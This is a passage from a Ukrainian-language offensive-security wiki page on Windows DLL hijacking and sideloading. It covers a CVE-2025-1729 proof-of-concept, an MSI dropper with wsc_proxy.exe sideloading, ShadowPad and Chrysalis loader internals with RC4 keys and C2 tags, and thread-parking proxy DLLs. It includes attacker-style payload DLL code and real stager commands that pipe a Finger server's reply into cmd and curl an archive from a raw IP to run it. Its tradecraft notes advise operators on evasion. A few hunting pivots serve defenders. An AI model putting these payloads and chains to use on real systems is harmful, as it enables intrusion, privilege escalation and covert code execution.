- Підключіться до хоста через RDP, на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.
- Виконання припиняється після завершення RDP-сеансу — своєчасно виконайте inject/migrate.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати запис в реєстрі вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його так, щоб він вказував на довільний binary/DLL, імпортувати його, а потім встановити `configuration` у назву цього AT. Це забезпечує виконання довільного коду в межах Accessibility framework.

Notes
- Запис у `%windir%\System32` і зміна значень HKLM потребують прав адміністратора.
- Уся логіка payload може міститися в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей приклад демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), що відстежується як **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом користувача, який увійшов у систему.
- **Directory Permissions**: Дозволяють запис для `CREATOR OWNER`, що дає локальним користувачам змогу розміщувати довільні файли.
- **DLL Search Behavior**: Спочатку намагається завантажити `hostfxr.dll` із робочого каталогу та записує "NAME NOT FOUND", якщо файл відсутній, що вказує на пріоритет пошуку в локальному каталозі.

### Exploit Implementation

Зловмисник може розмістити шкідливу заглушку `hostfxr.dll` у тому самому каталозі, скориставшись відсутньою DLL для досягнення виконання коду в контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Потік атаки

1. Як стандартний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску scheduled task о 9:30 під контекстом поточного користувача.
3. Якщо під час виконання task увійшов адміністратор, шкідлива DLL запускається в сесії адміністратора із середнім рівнем цілісності.
4. Об’єднайте стандартні техніки обходу UAC, щоб підвищити рівень із середнього до привілеїв SYSTEM.

## Практичний приклад: MSI CustomAction Dropper + DLL Side-Loading через підписаний Host (wsc_proxy.exe)

Зловмисники часто поєднують droppers на основі MSI з DLL side-loading, щоб виконувати payload у довіреному підписаному процесі.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. CustomAction непомітно запускається під час GUI-інсталяції (наприклад, дія LaunchApplication або VBScript), відновлюючи наступний етап із вбудованих ресурсів.
- Dropper записує легітимний підписаний EXE і шкідливу DLL в один каталог (приклад пари: підписаний Avast wsc_proxy.exe + контрольований зловмисником wsc.dll).
- Коли запускається підписаний EXE, порядок пошуку DLL у Windows спочатку завантажує wsc.dll із робочого каталогу, виконуючи код зловмисника в підписаному батьківському процесі (ATT&CK T1574.001).

Аналіз MSI (що шукати)
- Таблиця CustomAction:
- Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілої закономірності: LaunchApplication, що виконує вбудований файл у фоновому режимі.
- В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence і Binary.
- Вбудовані/розділені payloads у MSI CAB:
- Адміністративне розпакування: msiexec /a package.msi /qb TARGETDIR=C:\out
- Або використайте lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька невеликих фрагментів, які об’єднуються та розшифровуються CustomAction на VBScript. Типовий flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичний sideloading за допомогою wsc_proxy.exe
- Розмістіть ці два файли в одній папці:
- wsc_proxy.exe: легітимний підписаний host (Avast). Процес намагається завантажити wsc.dll за іменем із власного каталогу.
- wsc.dll: DLL attacker. Якщо не потрібні певні exports, достатньо DllMain; в іншому разі створіть proxy DLL і перенаправте необхідні exports до справжньої бібліотеки, виконуючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог експорту використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на визначення імені DLL host binary. Якщо host використовує абсолютні шляхи або безпечні прапорці завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет і мають враховуватися під час вибору host binary та набору exports.

## Підписані triads + зашифровані payloads (case study ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **triad із трьох файлів**, маскуючись під легітимне програмне забезпечення та зберігаючи core payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – зловживають файлами таких vendors, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers перейменовують executable так, щоб він був схожий на Windows binary (наприклад, `conhost.exe`), але Authenticode signature залишається дійсним.
2. **Malicious loader DLL** – розміщується поруч з EXE під очікуваним іменем (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC binary, obfuscated за допомогою ScatterBrain framework; її єдине завдання – знайти encrypted blob, розшифрувати його та reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` у тому самому каталозі. Після memory-mapping розшифрованого payload loader видаляє TMP file, щоб знищити forensic evidence.

Tradecraft notes:

* Перейменування signed EXE (зі збереженням початкового `OriginalFileName` у PE header) дає змогу маскувати його під Windows binary, водночас зберігаючи vendor signature. Тому відтворюйте звичку Ink Dragon розміщувати binaries, схожі на `conhost.exe`, які насправді є AMD/NVIDIA utilities.
* Оскільки executable залишається trusted, для більшості allowlisting controls достатньо, щоб ваша malicious DLL знаходилася поруч із ним. Зосередьтеся на кастомізації loader DLL; signed parent зазвичай може запускатися без змін.
* ShadowPad decryptor очікує, що TMP blob буде розташований поруч із loader і доступний для запису, щоб він міг обнулити файл після mapping. Залишайте каталог доступним для запису до моменту завантаження payload; після розміщення в пам’яті TMP file можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators поєднують DLL sideloading із LOLBAS, тому єдиним custom artifact на диску є malicious DLL поруч із trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell запускає `cmd.exe /c`, отримує commands із Finger server і передає їх у `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь сервера, що дає змогу operators змінювати second stage на стороні сервера.

- **Built-in download/extract:** Завантажує archive з benign extension, розпаковує його та розміщує sideload target разом із DLL у випадковому каталозі `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує progress і переходить за redirects; `tar -xf` використовує вбудований у Windows tar.

- **WMI/CIM launch:** Запускає EXE через WMI, тому telemetry показує процес, створений CIM, поки він завантажує colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з binaries, які надають перевагу local DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) працює під trusted name.

- **Hunting:** Створюйте alert на `forfiles`, коли `/p`, `/m` і `/c` з’являються разом; поза admin scripts це трапляється нечасто.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Під час нещодавнього intrusion Lotus Blossom зловживала trusted update chain, щоб доставити NSIS-packed dropper, який розміщував DLL sideload і повністю in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, розміщує перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` та encrypted blob `BluetoothService`, після чого запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` виконує mmap-load blob; `LogWrite` розшифровує його за допомогою custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material, отриманий із попереднього hash), перезаписує buffer plaintext shellcode, звільняє тимчасові дані та переходить до нього.
- Щоб уникнути IAT, loader визначає APIs шляхом hashing export names, використовуючи FNV-1a basis 0x811C9DC5 + prime 0x100019, потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює результат із salted target hashes.

Main shellcode (Chrysalis)
- Розшифровує PE-like main module шляхом повторного add/XOR/sub із key `gQ2JR&9;` у п’ять проходів, потім динамічно завантажує `Kernel32.dll` → `GetProcAddress`, щоб завершити import resolution.
- Відновлює DLL name strings під час runtime за допомогою per-character bit-rotate/XOR transforms, після чого завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить через **PEB → InMemoryOrderModuleList**, аналізує кожну export table блоками по 4 bytes за допомогою Murmur-style mixing і використовує `GetProcAddress` лише як fallback, якщо hash не знайдено.

Embedded configuration & C2
- Config міститься всередині dropped `BluetoothService` file за **offset 0x30808** (size **0x980**) і розшифровується за допомогою RC4 із key `qwhvb^435h&*7`, відкриваючи C2 URL та User-Agent.
- Beacons формують dot-delimited host profile, додають на початок tag `4Q`, потім RC4-encrypt із key `vAuig34%^325hGV` перед `HttpSendRequestA` через HTTPS. Responses розшифровуються RC4 і передаються до обробки через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode визначається CLI args: без args = install persistence (service/Run key), що вказує на `-i`; `-i` повторно запускає self із `-k`; `-k` пропускає install і запускає payload.

Alternate loader observed
- Під час того самого intrusion було розміщено Tiny C Compiler, а `svchost.exe -nostdlib -run conf.c` запускався з `C:\ProgramData\USOShared\`, поруч із `libtcc.dll`. C source, наданий attacker, містив shellcode, компілювався та запускався in-memory, не створюючи PE на диску. Відтворіть за допомогою:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей етап компіляції та запуску на основі TCC імпортував `Wininet.dll` під час виконання та завантажував shellcode другого етапу з URL, жорстко заданого в коді, створюючи гнучкий loader, який маскується під запуск компілятора.

## Sideloading підписаного host із proxying експорту та паркуванням потоку host

Деякі ланцюжки DLL sideloading додають **стабілізацію**, щоб легітимний host залишався активним достатньо довго для коректного завантаження наступних етапів, замість аварійного завершення після завантаження malicious DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістити довірений EXE поруч із malicious DLL, використовуючи очікуване ім’я залежності, наприклад `version.dll`.
- Malicious DLL **проксіює кожен очікуваний export** до справжньої системної DLL (наприклад `%SystemRoot%\\System32\\version.dll`), щоб resolution імпортів продовжував працювати, а процес host залишався функціональним.
- Після завантаження malicious DLL **патчить entry point host**, щоб основний потік переходив у нескінченний цикл `Sleep`, замість завершення роботи або виконання code path, які завершили б процес.
- Новий потік виконує справжню malicious роботу: розшифровує ім’я або шлях DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне DLL proxying зберігає сумісність API, але не гарантує, що host залишатиметься активним достатньо довго для наступних етапів.
- Паркування основного потоку в `Sleep(INFINITE)` — простий спосіб залишити підписаний процес активним, поки loader виконує розшифрування, staging або мережеве bootstrap у worker thread.
- Полювання лише на підозрілий `DllMain` може пропустити цей шаблон, якщо цікава поведінка відбувається після патчу entry point host і запуску secondary thread.

Мінімальний workflow
1. Скопіювати підписаний host EXE та визначити DLL, яку він resolution із локальної директорії.
2. Створити proxy DLL, що експортує ті самі функції та forwarding їх до легітимної DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити worker thread.
4. Із цього потоку пропатчити entry point host або start routine основного потоку, щоб він зациклювався на `Sleep`.
5. Розшифрувати ім’я/config DLL наступного етапу та викликати `LoadLibrary` або виконати manual-map payload.

Захисні pivots
- Підписані процеси, які завантажують `version.dll` або подібні поширені бібліотеки з власної директорії застосунку, а не з `System32`.
- Memory patches у entry point процесу невдовзі після завантаження image, особливо jumps/calls, перенаправлені до `Sleep`/`SleepEx`.
- Потоки, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Proxy DLL із повним набором export, розміщені поруч із виконуваними файлами vendor у доступних для запису staging-директоріях, таких як `ProgramData`, `%TEMP%` або шляхи розпакованих архівів.

## References

- [1] [Red Canary – Аналітичні висновки розвідки: січень 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 — підвищення привілеїв за допомогою TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store — TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna — TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc — DLL hijacking у Windows. Простий приклад на C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research — Nimbus Manticore розгортає нове malware, націлене на Європу](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec — Hack-cessibility: коли DLL Hijacks зустрічаються з Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC — api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 — Цифрові двійники: анатомія кампаній із постійним розвитком, що поширюють Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 — Конвергенція інтересів: аналіз threat clusters, націлених на уряд Південно-Східної Азії](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research — Усередині Ink Dragon: розкриття relay network і внутрішньої роботи stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 — Backdoor Chrysalis: детальний аналіз toolkit Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf — HTB Bruno ZipSlip → ланцюжок DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 — Відстеження espionage campaigns 2026 року іранського APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn — елемент `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn — елемент `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn — елемент `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn — елемент `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn — елемент `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn — елемент `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research — Fast and Furious: операції Nimbus Manticore під час іранського конфлікту](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn — Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK — T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 — CL-STA-1062 націлюється на уряди та критичну інфраструктуру Південно-Східної Азії](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
